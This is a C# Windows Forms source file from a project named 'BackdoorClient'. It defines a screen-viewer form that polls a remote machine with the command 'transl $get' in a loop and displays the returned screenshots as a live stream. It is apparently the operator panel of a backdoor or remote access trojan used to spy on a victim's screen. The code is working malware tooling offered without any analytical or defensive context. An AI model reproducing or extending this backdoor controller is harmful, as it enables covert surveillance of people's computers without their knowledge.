using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace BackdoorClient
{
    public partial class ScreenViewStream : Form
    {
        public static Form1 mainForm;
        public Thread UpdateScreenThread;
        public bool FormIsOpened = false;

        public ScreenViewStream(Form1 f)
        {
            mainForm = f;
            InitializeComponent();
        }
        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            FormIsOpened = false;
        }

        private void ScreenViewStream_Load(object sender, EventArgs e)
        {
            UpdateScreenThread = new Thread(() => UpdateScreen());
            FormIsOpened = true;
            UpdateScreenThread.Start();
        }

        private void UpdateScreen()
        {
            System.Threading.Thread.Sleep(1000);
            while (true)
            {
                if (!FormIsOpened) return;

                var pictrBytes = new byte[0];
                mainForm.Invoke(new Action(() => GetScreenshotFromBytes(out pictrBytes)));
                Bitmap bmp;
                try
                {
                    using (var ms = new MemoryStream(pictrBytes))
                    {
                        bmp = new Bitmap(ms);
                    }


                    translScreen.Image = bmp;
         
                }
                catch
                {

                }
                if(!translScreen.IsDisposed) translScreen?.Invoke(new Action(translScreen.Update));
                System.Threading.Thread.Sleep(100);
            }
        }

        public void GetScreenshotFromBytes(out byte[] buffer)
        {
            buffer = mainForm.SendCommandAndGetBytesResponce("transl $get");
        }

        private void translScreen_Click(object sender, EventArgs e)
        {

        }
    }
}
